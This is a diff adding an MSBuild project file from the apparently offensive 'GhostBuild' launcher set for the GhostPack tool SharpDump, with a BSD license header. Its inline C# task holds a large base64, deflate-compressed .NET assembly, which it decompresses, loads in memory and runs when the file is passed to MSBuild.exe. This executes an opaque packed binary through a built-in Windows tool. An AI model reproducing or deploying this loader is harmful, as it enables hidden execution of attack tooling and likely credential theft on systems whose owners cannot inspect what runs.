@@ -1,0 +1,65 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- GhostBuild: Simple MSBuild launchers for the GhostPack projects [ https://github.com/GhostPack ] -->
+  <!-- 64-bit GhostPack assemblies have been compiled with the .Net Fraemwork v4 and compressed with Out-CompressedDll. As with all code, you should inspect and compile your own versions -->
+  <!-- Usage: C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe c:\path\to\project.xml -->
+  <!-- License: BSD 3-Clause -->
+  <!-- SharpDump is provided under the 3-clause BSD license below. -->
+  <!-- ************************************************************* -->
+  <!-- Copyright (c) 2018, Will Schroeder -->
+  <!-- All rights reserved. -->
+  <!-- Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: -->
+  <!--     Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. -->
+  <!--     Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. -->
+  <!--     The names of its contributors may not be used to endorse or promote products derived from this software without specific prior written permission. -->
+  <!-- THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. -->
+  
+  <Target Name="GhostBuild">
+   <SharpDump />
+  </Target>
+<UsingTask
+    TaskName="SharpDump"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <ParameterGroup/>
+    <Task>
+        <Code Type="Class" Language="cs">
+            <![CDATA[
+                using System;
+                using System.IO;
+                using System.Reflection;
+                using System.IO.Compression;
+                using Microsoft.Build.Framework;
+                using Microsoft.Build.Utilities;
+
+                public class SharpDump :  Task, ITask
+                {
+                    public override bool Execute()
+                    {
+                        //Add args here (Must be in the form of a string array]
+                        string[] args = new string[] { "/?" };
+                        
+                        //Compile .Net Assembly.  Compress using @mattifestation's Out-CompressedDll [ https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-CompressedDll.ps1 ]
+                        string compressedBin = "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";
+                        
+                        //Add the byte cound/size. This is captured in the Out-CompressedDll output file
+                        int compressedBinSize = 7680;
+
+                        Byte[] bytesBin = new byte[compressedBinSize];
+                        using (MemoryStream inputStream = new MemoryStream(Convert.FromBase64String(compressedBin)))
+                        {
+                            using (DeflateStream stream = new DeflateStream(inputStream, CompressionMode.Decompress))
+                            {
+                                stream.Read(bytesBin, 0, compressedBinSize);
+                            }
+                        }
+                        
+                        Assembly assembly = Assembly.Load(bytesBin);
+                        assembly.EntryPoint.Invoke(null, new object[] { args });
+                        return true;
+                    }
+                }
+            ]]>
+        </Code>
+    </Task>
+    </UsingTask>
+</Project>
